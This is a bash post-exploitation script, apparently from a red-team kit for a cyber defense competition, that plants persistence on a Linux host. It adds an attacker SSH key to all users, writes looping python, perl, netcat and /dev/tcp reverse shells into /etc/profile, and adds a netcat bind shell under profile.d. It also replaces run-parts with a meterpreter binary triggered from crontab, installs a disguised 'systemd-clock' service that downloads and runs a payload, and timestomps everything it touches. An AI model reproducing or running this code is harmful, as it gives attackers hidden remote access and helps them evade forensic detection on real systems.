#!/usr/bin/env bash

# Root check
if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi


# *** Helper Functions ***

# Colors
COLOR_OFF='\033[0m'
BOLD_WHITE='\033[1;37m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
GREEN='\033[0;32m'

#######################################
# Log colored and status-prefixed text to the terminal depending on the
# user-provided log type.
#
# Globals:
#   All above colors
# Arguments:
#   Log type, one of "task", "error", "warning", "info", "log", or "debug"
#   Log message, the message to be printed to the terminal
# Outputs:
#   Colored and status-prefixed text otherwise, or usage on error
# Returns:
#   0 if cecho usage was correct, 1 otherwise
########################################
cecho() {
	local cecho_usage="${RED}[!] cecho usage: cecho <task|error|warning|info|log|debug|sep|done> <\"log_message\">${COLOR_OFF}"

	if [ $# -ne 2 ]; then
		echo -e "$cecho_usage"
		return 1
	fi

	local log_type=$1
	local log_message=$2

	case $log_type in
		"task")
			echo -e "${BOLD_WHITE}[+] --- ${log_message}${COLOR_OFF}"
			;;
		"error")
			echo -e "${RED}[!] ${log_message}${COLOR_OFF}" >&2 # print to STDERR
			;;
		"warning")
			echo -e "${YELLOW}[-] ${log_message}${COLOR_OFF}"
			;;
		"info")
			echo -e "${CYAN}[*] ${log_message}${COLOR_OFF}"
			;;
		"log")
			echo -e "${BLUE}[^] ${log_message}${COLOR_OFF}"
			;;
		"debug")
			echo -e "${PURPLE}[?] ${log_message}${COLOR_OFF}"
			;;
		"sep")
			echo -en "${YELLOW}"
			for _ in {1..10}; do echo -n "${log_message}"; done
			echo -e "${COLOR_OFF}"
			;;
		"done")
			echo -e "${GREEN}[=] ${log_message}${COLOR_OFF}"
			echo
			;;
		*)
			echo -e "$cecho_usage"
			return 1
			;;
	esac
}


#######################################
# Get a file's timestamp in YYYYMMDDhhmm format for use with "time -t".
#
# Globals:
#   None
# Arguments:
#   The file path to retrieve the timestamp from
# Outputs:
#   Status or usage on error, otherwise nothing
# Returns:
#   0 if stat obtained file's timestamp, 1 otherwise
########################################
get_timestamp() {
	if [ $# -ne 1 ]; then
		cecho error "get_timestamp usage: get_timestamp <file>"
		return 1
	fi
	
	local file="$1"

	if ! stat -L "$file" \
		| grep "Modify" \
		| cut -d " " -f 2,3 \
		| cut -d ":" -f 1,2 \
		| tr -d "-" \
		| tr -d ":" \
		| tr -d " "; then
		cecho error "Couldn't stat '$file'"
		return 1
	fi
}


#######################################
# Set a file's timestamp (perform a "timestomp").
#
# Globals:
#   None
# Arguments:
#   The file path to set the timestamp on
# Outputs:
#   Status or usage on error, otherwise nothing
# Returns:
#   0 if file's timestamp was set, 1 otherwise
########################################
set_timestamp() {
	if [ $# -ne 2 ]; then
		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
		return 1
	fi

	local timestamp="$1"
	local file="$2"

	if ! touch -t "$timestamp" "$file"; then
		cecho error "Couldn't modify timestamp for '$file'"
		return 1
	else
		cecho info "Modified timestamp for '$file'"
	fi
}


#######################################
# Check if the given command exists and is executable.
#
# Globals:
#   None
# Arguments:
#   The binary/command to search the existence of
# Outputs:
#   Usage information on improper usage, otherwise none
# Returns:
#   0 if the binary/command exists, 1 otherwise
########################################
exists() {
	if [ $# -ne 1 ]; then
		cecho error "exists usage: exists <binary/command/executable>"
		return 1
	fi
	
	local search="$1"

	test -x "$(command -v "$search")" &>/dev/null
}


# *** Configurable variables ***

IP="10.10.2.4"
NORMAL_PORT="59000"
WEB_PORT="59001"
REVERSE_PORT="59002"
BIND_PORT="60000"
FIFO_REVERSE="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
FIFO_BIND="systemd-private-68eb5cd948c03875a3aa64dc96efabaa-upower.service-O6ME4M"

SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDECrcus+R9kJjhjzm4iSvjTvqRUmpJCg1cxi4U1TrPnaUhz+k5utWzrJlJjm/Cn6lmTO75jcYCQwWGKatf2WwZtN5hkMb++d6DHb1KXOGrNdkEbgvA8DBMDkWbR9NUyLzF2enfSwdJqDRNVPWhTGyqUIPaHH5HCEAPmDxQnnojOFhRg5t+ZaxJtQ0GvGBKxIAcl+wn4OyiW7/EpT2dHsZactSZb+az2bWcP01W6UUYq8ttZADFI1+g31UEPd9tGJbkCbCg0jPsb9fGPN0QkIdRf9LMWqMBkLOscyT5VOyawZjsupFjYOiSswfcEvI3hmSc13crFQzR45wXn4IhjCgZ blackteam@wrccdc.org"

GLOBAL_PROFILE="/etc/profile"
GLOBAL_PROFILE_DIR="/etc/profile.d"
PROFILE_FILE="bash_completion.sh"

# Crontab meterpreter
METERPRETER="/tmp/linux_$NORMAL_PORT"
CRONTAB="/etc/crontab"
CRONTAB_FIND="[[:digit:]]\+[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+root[[:blank:]]\+cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
CRONTAB_REPLACE="\*  \*    \* \* \*   root    cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"

# Web delivery meterpreter
WEB_URI="systemd-clock"
WEB_PORT="8080"

# Services
SERVICE_PAYLOAD_PATH="/bin/$WEB_URI"
SERVICE_NAME="systemd-clock"
SERVICE_DESCRIPTION="Clock Service Daemon"
#SERVICE_COMMAND="/usr/bin/test -f $SERVICE_PAYLOAD_PATH || $(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI; $(which chmod) +x $SERVICE_PAYLOAD_PATH; $SERVICE_PAYLOAD_PATH; exit 0"
SERVICE_COMMAND="$(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI && $(which chmod) +x $SERVICE_PAYLOAD_PATH && $SERVICE_PAYLOAD_PATH && exit 0"

# systemd
SYSTEMD_SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
SYSTEMD_SERVICE="[Unit]
Description=$SERVICE_DESCRIPTION

[Service]
Type=simple
ExecStart=$SERVICE_COMMAND
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"

# SysVInit
INIT_SERVICE_PATH="/etc/init/${SERVICE_NAME}.conf"
INIT_PID_PATH="/var/run/csd.pid"
INIT_SERVICE="description \"$SERVICE_DESCRIPTION\"
start on filesystem or runlevel 2345
stop on shutdown
respawn
respawn limit 10 5
script
    echo \$\$ > $INIT_PID_PATH
    $SERVICE_COMMAND
end script"



# *** Main ***

cecho task "Adding SSH key to all users' authorized_keys files"

# Don't forget to include /root/.ssh/authorized_keys
for home_dir in /root /home/*; do

	# Ensure we're working on a directory, not a random file in /home/
	if [ -d "$home_dir" ]; then

		home_timestamp=$(get_timestamp "$home_dir")

		# Create user's ~/.ssh directory if necessary, and retrieve appropriate timestamps
		if [ -d "$home_dir/.ssh" ]; then
			ssh_timestamp=$(get_timestamp "$home_dir/.ssh")
			cecho log "'$home_dir/.ssh' already exists"
		else
			ssh_timestamp=$(get_timestamp "$home_dir")
			cecho info "Creating '$home_dir/.ssh'"
			mkdir -p "$home_dir/.ssh"
		fi

		# Retrieve appropriate timestamps for authorized_keys files
		if [ -f "$home_dir/.ssh/authorized_keys" ]; then
			keys_timestamp=$(get_timestamp "$home_dir/.ssh/authorized_keys")
			cecho log "'$home_dir/.ssh/authorized_keys' already exists"
		else
			keys_timestamp=$ssh_timestamp
			cecho info "Will create '$home_dir/.ssh/authorized_keys'"
		fi

		# Add the key
		echo "$SSH_KEY" >> "$home_dir/.ssh/authorized_keys" && cecho info "Added key to '$home_dir/.ssh/authorized_keys'" || cecho error "Could not write to '$home_dir/.ssh/authorized_keys'"

		# Timestomp
		set_timestamp $home_timestamp "$home_dir"
		set_timestamp $ssh_timestamp "$home_dir/.ssh"
		set_timestamp $keys_timestamp "$home_dir/.ssh/authorized_keys"

	else
		cecho warning "Skipping non-directory '$home_dir'"
	fi

done

cecho done "Done adding SSH key to authorized_keys files"


cecho task "Persisting reverse shells in '$GLOBAL_PROFILE'"

# Boilerplate revere_shells code taken from:
# Reverse Shell as a Service - https://reverse-shell.sh/ip:port
# https://github.com/lukechilds/reverse-shell
reverse_shells="
(setsid sh -c \"while true; do
  if command -v python > /dev/null 2>&1; then
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"$IP\\\",$REVERSE_PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' 2>/dev/null
    sleep 10
    continue
  fi

  if command -v perl > /dev/null 2>&1; then
    perl -e 'use Socket;\$i=\\\"$IP\\\";\$p=$REVERSE_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};' 2>/dev/null
		sleep 10
		continue
  fi

  if command -v nc > /dev/null 2>&1; then
    rm $FIFO_REVERSE;mkfifo $FIFO_REVERSE;cat $FIFO_REVERSE|/bin/sh -i 2>&1|nc $IP $REVERSE_PORT >$FIFO_REVERSE
		sleep 10
		continue
  fi

  if command -v sh > /dev/null 2>&1; then
    /bin/sh -i >& /dev/tcp/$IP/$REVERSE_PORT 0>&1
		sleep 10
		continue
  fi
done\")&"

if [ -f "$GLOBAL_PROFILE" ]; then
	profile_timestamp=$(get_timestamp "$GLOBAL_PROFILE")

	if grep -q "setsid sh" "$GLOBAL_PROFILE"; then
		cecho log "Reverse shell persistence already in '$GLOBAL_PROFILE', skipping"
	else
		echo "$reverse_shells" >> "$GLOBAL_PROFILE" && cecho info "Added reverse shell persistence to '$GLOBAL_PROFILE'" || cecho error "Could not add reverse shell persistence to '$GLOBAL_PROFILE'"
	fi

	set_timestamp $profile_timestamp "$GLOBAL_PROFILE"
else
	cecho warning "'$GLOBAL_PROFILE' does not exist, skipping reverse shell persistence"
fi

cecho done "Done persisting reverse shells in '$GLOBAL_PROFILE'"



cecho task "Adding netcat (nc) bind shell on port $BIND_PORT to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"

if ! exists nc; then
	cecho error "Netcat not installed, skipping"
elif [ ! -d "$GLOBAL_PROFILE_DIR" ]; then
	cecho error "Global profile directory '$GLOBAL_PROFILE_DIR' does not exist, skipping"
else
	tmp_timestamp=$(get_timestamp "/tmp")
	profile_dir_timestamp=$(get_timestamp "$GLOBAL_PROFILE_DIR")

	if [ ! -f "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" ]; then
		cecho info "File '$GLOBAL_PROFILE_DIR/$PROFILE_FILE' does not exist, it will be created"
		profile_file_timestamp=$profile_dir_timestamp
	else
		cecho log "File '$GLOBAL_PROFILE_DIR/$PROFILE_FILE' already exists"
		profile_file_timestamp=$(get_timestamp "$GLOBAL_PROFILE_DIR/$PROFILE_FILE")
	fi

	if grep -q "| /bin/sh -i 2>&1 | nc -nlp" "$GLOBAL_PROFILE_DIR/$PROFILE_FILE"; then
		cecho log "Netcat bind shell already placed in '$GLOBAL_PROFILE_DIR/$PROFILE_FILE', skipping"
	else
		if exists bakcat; then # the backup cat we may have created during the weakening script
			echo "(setsid sh -c \"rm -f /tmp/$FIFO_BIND-\$(whoami) && mkfifo /tmp/$FIFO_BIND-\$(whoami) && while true; do bakcat /tmp/$FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > /tmp/$FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
		else # original cat binary, untouched
			echo "(setsid sh -c \"rm -f /tmp/$FIFO_BIND-\$(whoami) && mkfifo /tmp/$FIFO_BIND-\$(whoami) && while true; do cat /tmp/$FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > /tmp/$FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
		fi
	fi

	set_timestamp $tmp_timestamp "/tmp"
	set_timestamp $profile_dir_timestamp "$GLOBAL_PROFILE_DIR"
	set_timestamp $profile_file_timestamp "$GLOBAL_PROFILE_DIR/$PROFILE_FILE"
fi

cecho done "Done adding netcat bind shell on port $BIND_PORT"



cecho task "Persisting meterpreter in '$CRONTAB' (stealthily)"

if [ -x "$METERPRETER" ]; then
	if [ -f "$CRONTAB" ]; then
		if ! which run-parts &>/dev/null; then
			cecho error "'run-parts' not on PATH, cannot plant meterpreter persistence in '$CRONTAB', skipping"
		else
			run_parts_path=$(which run-parts)

			usr_bin_timestamp=$(get_timestamp "/usr/bin") 
			bin_timestamp=$(get_timestamp "/bin")
			run_parts_timestamp=$(get_timestamp "$run_parts_path")
			etc_timestamp=$(get_timestamp "/etc")
			crontab_timestamp=$(get_timestamp "$CRONTAB")

			if cp -f "$METERPRETER" "$run_parts_path" 2>/dev/null; then
				cecho info "Copied meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path'"

				# The whole purpose of this is to change the callback frequency to every minute, not
				# whatever its default is which I believe is on the 17th minute of every hour.
				if grep -q "$CRONTAB_REPLACE" "$CRONTAB"; then # what we've already replaced
					cecho log "Meterpreter persistence already in '$CRONTAB', skipping"
				elif grep -q "$CRONTAB_FIND" "$CRONTAB"; then # what we want to replace
					sed -i "s/$CRONTAB_FIND/$CRONTAB_REPLACE/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
				elif grep -q "$CRONTAB_SOMETHING" "$CRONTAB"; then # something exists in crontab
					first_task=$(grep -m 1 "$CRONTAB_SOMETHING" "$CRONTAB" | sed 's/\*/\\\*/g' | sed 's/\//\\\//g' | sed 's/\&/\\\&/g')
					prepended="$CRONTAB_REPLACE\n$first_task"
					sed -i "s/$first_task/$prepended/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || echo error "Could not add meterpreter persistence to '$CRONTAB'"
				else # nothing exists in crontab
					echo "$CRONTAB_REPLACE_NORMAL" >> "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
				fi

				set_timestamp $usr_bin_timestamp "/usr/bin"
				set_timestamp $bin_timestamp "/bin"
				set_timestamp $run_parts_timestamp "$run_parts_path"
				set_timestamp $etc_timestamp "/etc"
				set_timestamp $crontab_timestamp "$CRONTAB"
			else
				cecho error "Could not copy meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path', skipping"
			fi
		fi
	else
		cecho error "Crontab file '$CRONTAB' doesn't exist, skipping stealthy crontab persistence"
	fi
else
	cecho error "Meterpreter binary '$METERPRETER' not executable/doesn't exist, skipping stealthy crontab persistence"
fi

cecho done "Done persisting meterpreter in '$CRONTAB' (stealthily)"



cecho task "Persisting meterpreter via web delivery as a service"

if pidof systemd &>/dev/null; then # systemd
	if [ -f "$SYSTEMD_SERVICE_PATH" ]; then
		cecho log "Malicious service already exists at '$SYSTEMD_SERVICE_PATH'"
	else
		etc_system_timestamp=$(get_timestamp "/etc/systemd/system")
		bin_timestamp=$(get_timestamp "/bin")

		if echo "$SYSTEMD_SERVICE" > "$SYSTEMD_SERVICE_PATH"; then
			cecho info "Malicious service created at '$SYSTEMD_SERVICE_PATH'"
			chmod 644 "$SYSTEMD_SERVICE_PATH"
		else
			echo error "Could not add malicious service at '$SYSTEMD_SERVICE_PATH'"
		fi

		systemctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"
		systemctl enable "$SERVICE_NAME" && cecho info "Enabled malicious service '$SERVICE_NAME'" || cecho error "Could not enable maliicous service '$SERVICE_NAME'"

		sleep 1 # ensure everything's ran before modifying timestamps

		set_timestamp $etc_system_timestamp "/etc/systemd/system"
		set_timestamp $etc_system_timestamp "$SYSTEMD_SERVICE_PATH"
		set_timestamp $bin_timestamp "/bin"
		set_timestamp $bin_timestamp "$SERVICE_PAYLOAD_PATH"
	fi
elif [ -d "/etc/init" ]; then # SysVInit
	if [ -f "$INIT_SERVICE_PATH" ]; then
		cecho log "Malicious service already exists at '$INIT_SERVICE_PATH'"
	else
		init_timestamp=$(get_timestamp "/etc/init")
		run_timestamp=$(get_timestamp "/var/run")
		bin_timestamp=$(get_timestamp "/bin")

		if echo "$INIT_SERVICE" > "$INIT_SERVICE_PATH"; then
			cecho info "Malicious service created at '$INIT_SERVICE_PATH'"
			chmod 644 "$INIT_SERVICE_PATH"
		else
			cecho error "Could not add malicious service at '$INIT_SERVICE_PATH'"
		fi

		initctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"

		sleep 1 # ensure everything's ran before modifying timestamps

		set_timestamp $init_timestamp "/etc/init"
		set_timestamp $init_timestamp "$INIT_SERVICE_PATH"
		set_timestamp $run_timestamp "/var/run"
		set_timestamp $run_timestamp "$INIT_PID_PATH"
		set_timestamp $bin_timestamp "/bin"
		set_timestamp $bin_timestamp "$SERVICE_PAYLOAD_PATH"
	fi
else # unknown
	cecho error "No valid init systems detected for meterpreter web delivery service persistence"
fi

cecho done "Done persisting meterpreter via web delivery as a service"



# Bind shell
#if $(which nc); then
#	nc_dir=""
#	nc_name="tmp"
#	/bin/bash -c mkdir -p "/tmp/$nc_dir" && cp "/usr/bin/nc" "/tmp/$nc_dir/$nc_name" & while true; do "/tmp/$nc_dir/$nc_name" -nlp 60000 -e /bin/bash; done
#else
#	cecho warning "netcat binary not present on system, cannot install bind shell"
#fi



echo
cecho done "--- ALL PERSISTENCE PLANTED ---"
cecho debug "Don't forget to delete me!"
